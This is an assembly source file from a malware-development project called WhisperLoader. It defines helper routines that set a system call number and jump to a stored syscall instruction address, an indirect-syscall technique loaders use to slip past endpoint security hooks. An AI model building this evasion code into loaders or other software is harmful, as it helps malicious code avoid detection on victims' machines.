; Copyright 2026 MalDev Academy
; WhisperLoader - Licensed under the Apache License, Version 2.0 (the "License")
; https://github.com/Maldev-Academy/WhisperLoader

.data
	wSystemCallNumber		DWORD	0h	
	qSyscallInsAdress		QWORD	0h	


.code

SetSSn PROC
	mov wSystemCallNumber, ecx
	mov qSyscallInsAdress, rdx
	ret
SetSSn ENDP


RunSyscall PROC
	mov r10, rcx
	mov eax, wSystemCallNumber
	jmp qword ptr [qSyscallInsAdress]
	ret
RunSyscall ENDP


end